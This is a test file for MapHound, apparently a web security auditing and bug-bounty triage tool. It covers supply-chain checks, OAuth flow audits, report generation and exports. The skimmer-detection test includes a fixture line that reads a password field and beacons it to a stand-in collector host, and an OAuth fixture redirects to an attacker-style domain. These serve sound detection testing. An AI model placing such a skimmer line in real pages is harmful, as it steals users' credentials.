import 'fake-indexeddb/auto';
import { describe, expect, it } from 'vitest';
import { DB_VERSION, openMaphoundDb } from '@/core/db';
import {
  auditOAuthPage,
  auditOAuthRuntimeDom,
  auditOAuthSource,
  auditSubresourceIntegrity,
  compareSemver,
  detectSkimmerPatterns,
  fingerprintLibraries,
} from '@/engine/audit';
import { buildSarifLog } from '@/engine/export/sarif';
import { LineIndex } from '@/engine/intel/lexer';
import {
  buildWorkspaceOpenApi,
  filterByTriage,
  findingTriageId,
  generateSingleBountyReport,
  generateTriageReportMarkdown,
  mergeWorkspaceState,
  registrableDomainFor,
  sitesInWorkspace,
  type TriageRecord,
} from '@/engine/workspace';
import { exportSourceZip } from '@/engine/zip/export';

describe('Target Workspace (v0.8.0)', () => {
  it('extracts registrable root domains and groups sibling subdomains', () => {
    expect(registrableDomainFor('https://app.shop.example.com/checkout')).toBe('example.com');
    expect(registrableDomainFor('https://api.example.com')).toBe('example.com');
    expect(registrableDomainFor('http://127.0.0.1:8080')).toBe('127.0.0.1');

    const grouped = sitesInWorkspace(
      [
        {
          origin: 'https://app.example.com',
          scope: 'origin',
          enabledAt: 1,
          settings: { aggressiveMapProbing: false, useCredentials: false },
        },
        {
          origin: 'https://api.example.com',
          scope: 'origin',
          enabledAt: 2,
          settings: { aggressiveMapProbing: false, useCredentials: false },
        },
        {
          origin: 'https://other.test',
          scope: 'origin',
          enabledAt: 3,
          settings: { aggressiveMapProbing: false, useCredentials: false },
        },
      ],
      'https://app.example.com',
    );
    expect(grouped.map((s) => s.origin)).toEqual([
      'https://api.example.com',
      'https://app.example.com',
    ]);
  });

  it('merges multi-page findings, endpoints, runtime traffic and builds unified OpenAPI', () => {
    const merged = mergeWorkspaceState({
      domain: 'example.com',
      origins: ['https://app.example.com', 'https://checkout.example.com'],
      jobs: [],
      scripts: [],
      maps: [],
      findings: [
        {
          id: 'https://app.example.com|aws|h1',
          ruleId: 'aws',
          ruleName: 'AWS Key',
          severity: 'high',
          confidence: 'high',
          origin: 'https://app.example.com',
          scriptHash: 's1',
          file: 'src/a.ts',
          line: 10,
          column: 2,
          locationKind: 'source',
          preview: 'AKIA…1234',
          snippet: 'const k = "AKIA…1234";',
          secretHash: 'h1',
          secret: 'AKIA_TEST_1234',
          occurrences: 1,
          locations: [
            {
              file: 'src/a.ts',
              line: 10,
              column: 2,
              kind: 'source',
              scriptUrl: 'https://app.example.com/a.js',
            },
          ],
          references: [],
          createdAt: 1,
          updatedAt: 1,
        },
        {
          id: 'https://checkout.example.com|aws|h1',
          ruleId: 'aws',
          ruleName: 'AWS Key',
          severity: 'high',
          confidence: 'high',
          origin: 'https://checkout.example.com',
          scriptHash: 's2',
          file: 'src/b.ts',
          line: 20,
          column: 4,
          locationKind: 'source',
          preview: 'AKIA…1234',
          snippet: 'const k = "AKIA…1234";',
          secretHash: 'h1',
          secret: 'AKIA_TEST_1234',
          occurrences: 2,
          locations: [
            {
              file: 'src/b.ts',
              line: 20,
              column: 4,
              kind: 'source',
              scriptUrl: 'https://checkout.example.com/b.js',
            },
          ],
          references: [],
          createdAt: 2,
          updatedAt: 2,
        },
      ],
      intel: [],
      pages: [],
      audits: [
        {
          id: 'a1',
          origin: 'https://app.example.com',
          pageUrl: 'https://app.example.com/dashboard',
          headers: {},
          matrix: [],
          findings: [],
          storageKeysChecked: 0,
          cookiesChecked: 0,
          updatedAt: 1,
        },
        {
          id: 'a2',
          origin: 'https://checkout.example.com',
          pageUrl: 'https://checkout.example.com/checkout',
          headers: {},
          matrix: [],
          findings: [],
          storageKeysChecked: 0,
          cookiesChecked: 0,
          updatedAt: 2,
        },
      ],
      runtimeApi: [
        {
          id: 'r1',
          origin: 'https://app.example.com',
          method: 'POST',
          path: '/api/v1/orders',
          status: 200,
          authHeaders: ['Authorization'],
          requestKeys: ['orderId'],
          responseKeys: ['status'],
          count: 1,
          lastSeen: 1,
        },
      ],
      runtimeDom: [],
    });

    expect(merged.pageCount).toBe(2);
    expect(merged.findings).toHaveLength(1);
    expect(merged.findings[0]?.occurrences).toBe(3);
    expect(merged.findings[0]?.locations).toHaveLength(2);
    expect(merged.intel.endpoints.some((e) => e.value === '/api/v1/orders')).toBe(true);

    const spec = JSON.parse(buildWorkspaceOpenApi(merged, '0.8.0'));
    expect(spec.openapi).toBe('3.0.3');
    expect(spec.paths['/api/v1/orders']).toBeDefined();
  });
});

describe('Supply Chain Auditor (v0.8.0)', () => {
  it('detects missing SRI and missing crossorigin on third-party tags', () => {
    const findings = auditSubresourceIntegrity('https://app.example.com/checkout', [
      { tag: 'script', url: 'https://cdn.thirdparty.test/sdk.js' },
      {
        tag: 'stylesheet',
        url: 'https://cdn.thirdparty.test/style.css',
        integrity: `sha384-${'A'.repeat(64)}`,
      },
      {
        tag: 'script',
        url: 'https://app.example.com/local.js',
      },
    ]);

    expect(findings).toHaveLength(2);
    expect(findings[0]?.ruleId).toBe('supply-chain.missing-sri');
    expect(findings[1]?.ruleId).toBe('supply-chain.missing-crossorigin');
  });

  it('fingerprints outdated libraries offline and compares semver accurately', () => {
    expect(compareSemver('3.4.1', '3.5.0')).toBeLessThan(0);
    expect(compareSemver('4.17.21', '4.17.21')).toBe(0);

    const libs = fingerprintLibraries(
      '/*! jQuery JavaScript Library v3.4.1 */\n{"name":"lodash","version":"4.17.15"}',
      ['node_modules/handlebars-4.7.6/dist/handlebars.js'],
    );
    expect(
      libs
        .filter((l) => l.vulnerable)
        .map((l) => l.name)
        .sort(),
    ).toEqual(['handlebars', 'jquery', 'lodash']);
  });

  it('detects potential web skimmer / exfiltration patterns', () => {
    const code = [
      '/*! jQuery v3.3.1 */',
      'const cc = document.querySelector(\'input[type="password"]\').value;',
      'navigator.sendBeacon("https://evil-collector.test/collect", cc);',
    ].join('\n');
    const hits = detectSkimmerPatterns(
      code,
      new LineIndex(code),
      { file: 'src/checkout.js', kind: 'source', scriptUrl: 'https://shop.example.com/app.js' },
      'https://shop.example.com',
    );

    expect(hits.some((h) => h.ruleId === 'supply-chain.outdated-jquery')).toBe(true);
    expect(hits.some((h) => h.ruleId === 'supply-chain.skimmer-exfil')).toBe(true);
  });
});

describe('OAuth 2.0 / OIDC / SAML Auditor (v0.8.0)', () => {
  it('flags fragment tokens, Implicit Flow, missing state/nonce/PKCE and cross-origin redirect_uri', () => {
    const url =
      'https://auth.example.com/oauth/authorize?response_type=id_token%20token&client_id=abc&redirect_uri=https://evil.test/cb#access_token=eyJhbGciOiJSUzI1NiJ9.payload.sig';
    const findings = auditOAuthPage(url);
    const rules = findings.map((f) => f.ruleId);

    expect(rules).toContain('oauth.fragment-token-leak');
    expect(rules).toContain('oauth.implicit-flow');
    expect(rules).toContain('oauth.missing-state');
    expect(rules).toContain('oauth.missing-nonce');
    expect(rules).toContain('oauth.open-redirect-uri');
    // Token value must be masked
    const frag = findings.find((f) => f.ruleId === 'oauth.fragment-token-leak');
    expect(frag?.preview).not.toContain('payload');
  });

  it('flags Implicit Flow, missing PKCE/state and dynamic redirect_uri in source code', () => {
    const src = [
      'const authUrl = "https://idp.example.com/oauth2/authorize?response_type=code&client_id=123";',
      'const cfg = { response_type: "token", redirect_uri: window.location.href };',
    ].join('\n');
    const hits = auditOAuthSource(src, new LineIndex(src), {
      file: 'src/auth.ts',
      kind: 'source',
      scriptUrl: 'https://app.example.com/auth.js',
    });
    const rules = hits.map((h) => h.ruleId);
    expect(rules).toContain('oauth.implicit-flow');
    expect(rules).toContain('oauth.dynamic-redirect-uri');
    expect(rules).toContain('oauth.missing-state');
    expect(rules).toContain('oauth.missing-pkce');
  });

  it('detects OAuth tokens observed in runtime postMessage events', () => {
    const findings = auditOAuthRuntimeDom([
      {
        id: 'pm1',
        origin: 'https://app.example.com',
        kind: 'postMessage',
        detail: '{"access_token":"masked"}',
        senderOrigin: 'https://partner.test',
        stack: [],
        count: 1,
        lastSeen: 1,
      },
    ]);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.ruleId).toBe('oauth.postmessage-token');
  });
});

describe('Bug Bounty Triage, SARIF & ZIP Export (v0.8.0)', () => {
  it('suppresses false positives and generates HackerOne/Bugcrowd Markdown reports', async () => {
    const db = await openMaphoundDb('v080-triage-test');
    expect(db.version).toBe(DB_VERSION);

    const fpId = findingTriageId('secret', 'aws', 'hash-fp');
    const okId = findingTriageId('oauth', 'oauth.implicit-flow', '/authorize');

    const records: TriageRecord[] = [
      {
        id: fpId,
        origin: 'https://app.example.com',
        domain: 'example.com',
        kind: 'secret',
        title: 'Test placeholder key',
        severity: 'low',
        status: 'false_positive',
        note: 'Non-production fixture',
        updatedAt: 1,
      },
      {
        id: okId,
        origin: 'https://app.example.com',
        domain: 'example.com',
        kind: 'oauth',
        title: 'OAuth Implicit Flow exposed',
        severity: 'high',
        status: 'confirmed',
        note: 'Verified on /oauth/authorize callback.',
        asset: 'https://app.example.com/oauth/authorize',
        evidence: 'response_type=token',
        updatedAt: 2,
      },
    ];
    for (const r of records) await db.put('triage', r);
    const saved = await db.getAllFromIndex('triage', 'by-domain', 'example.com');
    expect(saved).toHaveLength(2);

    const byId = new Map(saved.map((r) => [r.id, r]));
    const filtered = filterByTriage([fpId, okId], (x) => x, byId, false);
    expect(filtered.visible).toEqual([okId]);
    expect(filtered.dismissedCount).toBe(1);

    const single = generateSingleBountyReport(records[1]!, {
      target: 'https://app.example.com',
      generator: 'MapHound 0.8.0',
      exportedAt: '2026-11-28T00:00:00Z',
    });
    expect(single).toContain('# [HIGH] OAuth Implicit Flow exposed');
    expect(single).toContain('## Verification Steps');
    expect(single).toContain('## Remediation');

    const report = generateTriageReportMarkdown(saved, {
      target: '*.example.com',
      generator: 'MapHound 0.8.0',
      exportedAt: '2026-11-28T00:00:00Z',
    });
    expect(report).toContain('# Bug Bounty Triage Report — *.example.com');
    expect(report).toContain('OAuth Implicit Flow exposed');
    expect(report).not.toContain('Test placeholder key');

    // Verify SARIF includes supply-chain & oauth audit findings
    const sarif = buildSarifLog({
      findings: [],
      sinks: [],
      auditFindings: auditSubresourceIntegrity('https://app.example.com', [
        { tag: 'script', url: 'https://cdn.thirdparty.test/a.js' },
      ]),
      origin: 'https://app.example.com',
      version: '0.8.0',
    });
    expect(sarif.runs[0].results.some((r) => r.ruleId === 'audit/supply-chain.missing-sri')).toBe(
      true,
    );

    // Verify ZIP includes TRIAGE_REPORT.md
    const chunks: Uint8Array[] = [];
    await exportSourceZip(
      {
        site: { origin: 'https://app.example.com', scope: 'origin' },
        maps: [],
        scripts: [],
        jobs: [],
        triage: saved,
        workspace: {
          domain: 'example.com',
          origins: ['https://app.example.com'],
          visitedPages: ['https://app.example.com/oauth/authorize'],
        },
        readBlob: async () => undefined,
      },
      {
        generator: 'MapHound 0.8.0',
        onData: (chunk) => chunks.push(chunk),
      },
    );
    const total = chunks.reduce((s, c) => s + c.byteLength, 0);
    expect(total).toBeGreaterThan(200);
  });
});
